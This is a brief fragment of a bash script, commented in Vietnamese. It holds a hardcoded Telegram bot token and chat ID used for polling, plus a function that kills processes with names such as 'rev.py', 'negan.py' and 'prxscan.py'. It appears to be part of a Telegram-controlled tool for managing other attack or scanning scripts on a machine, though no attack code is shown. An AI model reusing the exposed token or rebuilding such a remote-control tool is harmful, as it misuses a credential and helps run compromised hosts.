#!/bin/bash
# Cấu hình Telegram
TELEGRAM_TOKEN="7828296793:AAEKPoIEqQLYgbBqpYJTxk9RpslA250oDxQ"
CHAT_ID="7371969470"
POLLING_INTERVAL=14
START_TIME=$(date +%s)
STOP_POLLING=false
...
# Kill tiến trình
strong_kill() {
    local processes=("rev.py" "negan.py" "prxscan.py" "start.sh" "monitor.sh" "setup.sh" "killermix.sh" "killer.sh" "ngcsl.js" "ok.js")
